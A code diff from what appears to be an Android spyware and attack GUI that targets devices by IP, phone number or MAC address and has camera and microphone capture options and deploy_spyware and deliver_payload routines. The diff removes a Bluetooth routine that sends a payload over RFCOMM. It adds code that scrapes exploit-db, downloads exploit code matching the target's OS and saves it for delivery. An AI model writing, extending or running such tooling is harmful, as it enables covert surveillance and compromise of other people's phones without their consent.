@@ -59,7 +59,7 @@ class AndroidTab(QWidget):
         search_layout = QHBoxLayout()
         self.search_input = QLineEdit()
         self.search_types = QComboBox()
-        self.search_types.addItems(["IP Address", "Phone Number", "MAC Address", "Bluetooth"])
+        self.search_types.addItems(["IP Address", "Phone Number", "MAC Address"])
         self.search_btn = QPushButton("Search")
         search_layout.addWidget(QLabel("Search By:"))
         search_layout.addWidget(self.search_types)
@@ -69,15 +69,7 @@ class AndroidTab(QWidget):
         # Target results
         self.results_list = QListWidget()
 
-        # Bluetooth search section
-        bt_layout = QHBoxLayout()
-        self.bt_scan_btn = QPushButton("Scan for Devices")
-        self.bt_results = QListWidget()
-        bt_layout.addWidget(self.bt_scan_btn)
-        bt_layout.addWidget(self.bt_results)
-
         layout = QVBoxLayout()
-        layout.addLayout(bt_layout)
         layout.addLayout(search_layout)
         layout.addWidget(self.camera_checkbox)
         layout.addWidget(self.microphone_checkbox)
@@ -88,7 +80,7 @@ class AndroidTab(QWidget):
         self.setLayout(layout)
 
         self.search_btn.clicked.connect(self.search_target)
-        self.bt_scan_btn.clicked.connect(self.scan_bluetooth)
+        # Bluetooth capability removed
 
     def search_target(self):
         import requests
@@ -151,9 +143,7 @@ class AndroidTab(QWidget):
             response = requests.get(f"https://ip-api.com/json/{query}")
         elif search_type == "MAC Address":
             response = requests.get(f"https://macvendors.com/query/{query}")
-        elif search_type == "Bluetooth":
-            self.scan_bluetooth()
-            return
+        # Bluetooth capability removed
         if response:
             results = response.json()
             self.populate_results(results)
@@ -170,61 +160,7 @@ class AndroidTab(QWidget):
         self.output.append(f"[+] Selected target: {target_info}")
         self.scan_target()
 
-    def scan_bluetooth(self):
-        self.output.append("[+] Scanning for Bluetooth devices...")
-        try:
-            from bluetooth_scanner import BluetoothScanner, BLUETOOTH_AVAILABLE
-            if not BLUETOOTH_AVAILABLE:
-                self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
-                return
-            scanner = BluetoothScanner()
-            devices = scanner.discover_devices()
-            self.bt_results.clear()
-            for device in devices:
-                self.bt_results.addItem(f"{device['name']} ({device['address']})")
-            self.bt_results.itemClicked.connect(self.select_bluetooth_device)
-        except Exception as e:
-            self.output.append(f"[-] Bluetooth scan error: {str(e)}")
-
-    def select_bluetooth_device(self, item):
-        device_info = item.text()
-        device_addr = device_info.split("(")[1].split(")")[0]
-        self.output.append(f"[+] Selected Bluetooth device: {device_info}")
-        self.scan_device(device_addr)
-
-    def scan_device(self, device_addr):
-        try:
-            from bluetooth_scanner import BluetoothScanner, BLUETOOTH_AVAILABLE
-            if not BLUETOOTH_AVAILABLE:
-                self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
-                return
-            scanner = BluetoothScanner()
-            services = scanner.scan_device(device_addr)
-            self.output.append(f"[+] Discovered services: {len(services)}")
-            for service in services:
-                self.output.append(f"  - {service['name']} ({service['protocol']})")
-            if any(s['protocol'] in ['rfcomm', 'spp'] for s in services):
-                self.output.append("[+] Found exploitable Bluetooth service")
-                self.deploy_payload(device_addr, "bluetooth")
-        except Exception as e:
-            self.output.append(f"[-] Bluetooth device scan error: {str(e)}")
-
-    def deploy_payload(self, device_addr, device_type):
-        if device_type == "bluetooth":
-            try:
-                from bluetooth_scanner import BLUETOOTH_AVAILABLE
-                if not BLUETOOTH_AVAILABLE:
-                    self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
-                    return
-                import bluetooth
-                payload = self.create_bluetooth_payload()
-                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
-                sock.connect((device_addr, 1))
-                sock.send(payload)
-                sock.close()
-                self.output.append("[+] Bluetooth payload sent successfully")
-            except Exception as e:
-                self.output.append(f"[-] Bluetooth payload delivery failed: {str(e)}")
+        # Bluetooth capability removed
 
     def deploy_spyware(self):
         # Scan target automatically
@@ -279,12 +215,38 @@ class AndroidTab(QWidget):
     def generate_payload(self, os_type, services):
         import requests
         import subprocess
-        exploit_url = f"https://exploit-db.com/search?platform={os_type}&services={','.join(services)}"
-        response = requests.get(exploit_url)
-        exploits = response.json()
-        best_exploit = max(exploits, key=lambda x: x['score'])
-        payload_url = best_exploit['url']
-        subprocess.run(["wget", payload_url])
+        # Query exploit-db.com for exploits matching OS and services
+        search_url = f"https://www.exploit-db.com/search?platform={os_type}&type=remote&port=&author=&order_by=date&order=desc"
+        self.output.append(f"[+] Suche Exploits für {os_type} und Services: {', '.join(services)}")
+        # For demo: Use the HTML page and parse for exploit links (real API would be better)
+        try:
+            page = requests.get(search_url)
+            if page.status_code == 200:
+                # Simple HTML parsing for exploit links (demo, not robust)
+                import re
+                matches = re.findall(r'/exploits/(\d+)', page.text)
+                if matches:
+                    exploit_id = matches[0]
+                    exploit_page = f"https://www.exploit-db.com/exploits/{exploit_id}"
+                    self.output.append(f"[+] Gefundener Exploit: {exploit_page}")
+                    # Download exploit code (if available)
+                    raw_url = f"https://www.exploit-db.com/download/{exploit_id}"
+                    exploit_code = requests.get(raw_url)
+                    if exploit_code.status_code == 200:
+                        filename = f"exploit_{os_type}_{exploit_id}.py"
+                        with open(filename, 'wb') as f:
+                            f.write(exploit_code.content)
+                        self.output.append(f"[+] Exploit-Code gespeichert: {filename}")
+                        # Optionally: Compile or prepare payload if needed
+                        return filename
+                    else:
+                        self.output.append(f"[-] Exploit-Code konnte nicht geladen werden: {raw_url}")
+                else:
+                    self.output.append("[-] Kein passender Exploit gefunden.")
+            else:
+                self.output.append(f"[-] Fehler beim Abrufen von Exploit-DB: {page.status_code}")
+        except Exception as e:
+            self.output.append(f"[-] Exploit-DB Fehler: {str(e)}")
         return f"compiled_{os_type}_payload"
 
     def deliver_payload(self, target_ip, platform):
